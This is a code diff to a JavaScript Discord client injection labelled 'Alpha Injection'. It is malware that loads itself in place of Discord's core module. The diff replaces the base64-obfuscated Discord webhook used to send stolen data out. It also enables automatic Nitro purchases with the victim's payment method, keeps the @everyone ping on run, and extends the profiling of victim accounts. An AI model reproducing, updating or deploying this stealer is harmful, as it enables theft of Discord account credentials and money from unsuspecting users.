@@ -4,12 +4,12 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const Buffer = require('buffer').Buffer
-const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExNTQxMTQ1MzM2OTkxMzQyNC9Hb2F3OXNsUTRRLTZUVU9JSVBxV1ZCSkRGQXREWTQyX0MwM1VBZ3ZwRUVpM240SU95RkhWd2lRYUljU0ZzWkJnWW80Tw=='
+const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExODM1MTg3OTM3NDYzOTExNC9MMGhRWnlKclhRWUh2Zk5vUHNRd1dDcDI1bXVENnFIelFlMlN5cW9FOGFGNS0ta0FOZjZzSnRHMk5Ed0hYb2tZLUpnYQ=='
 
 const config = {
   webhook: Buffer.from(hook, 'base64').toString('ascii'),
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Alpha Injection', 
@@ -590,6 +590,9 @@ const getBadges = (flags) => {
     case 131072:
       badges += 'Verified Bot Developer, ';
       break;
+    case 4194304:
+      badges += 'Active Developer, ';
+      break;
     case 4:
       badges += 'Hypesquad Event, ';
       break;
@@ -990,4 +993,5 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
+
 module.exports = require('./core.asar');
